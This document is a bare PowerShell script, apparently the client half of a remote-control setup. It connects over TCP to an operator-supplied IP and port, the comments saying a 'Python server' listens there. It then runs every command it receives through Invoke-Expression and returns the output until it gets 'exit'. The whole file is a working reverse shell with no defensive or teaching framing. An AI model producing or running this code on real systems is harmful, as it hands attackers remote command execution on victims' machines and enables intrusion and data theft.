param(
    [Parameter(Mandatory=$true)]
    [string]$ServerIPAddress,  # IP address of the Python server
    [Parameter(Mandatory=$true)]
    [int]$Port              # The port number on which the server is listening
    )
# Opens Tcp socket session with server
try {
    $client = New-Object System.Net.Sockets.TcpClient($ServerIPAddress, $Port)
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)

    while($true) {
        $command = $reader.ReadLine()
        if ($command -eq "exit") { break }  # Exit loop if 'exit' command is received

        # Execute the command and capture the output
        $output = Invoke-Expression $command 2>&1 | Out-String

        # Send the output back to the server
        $writer.WriteLine($output)
        $writer.Flush()
    }
} catch {
    Write-Error $_
} finally {
    $stream.Close()
    $client.Close()
}
